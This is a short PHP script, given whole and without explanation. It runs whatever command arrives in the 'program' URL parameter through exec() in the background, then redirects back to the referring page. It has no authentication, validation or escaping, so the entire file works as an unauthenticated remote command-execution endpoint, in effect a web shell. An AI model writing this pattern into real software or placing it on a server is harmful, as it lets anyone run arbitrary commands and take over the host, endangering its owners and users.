<?php
if (isset($_GET["program"])) {
  exec($_GET["program"] . "  > /dev/null 2>&1 &", $output, $result);
  header('Location: ' . $_SERVER['HTTP_REFERER']);
}
?>
